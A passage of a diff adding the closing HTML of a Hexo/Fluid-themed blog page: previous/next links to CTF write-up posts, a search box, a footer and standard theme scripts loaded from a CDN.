+                        <span class="hidden-mobile">pwn.college: Intermediate Memory Errors</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/24/Moectf2024-wp/" title="Moe2024-wp">
+                        <span class="hidden-mobile">Moe2024-wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
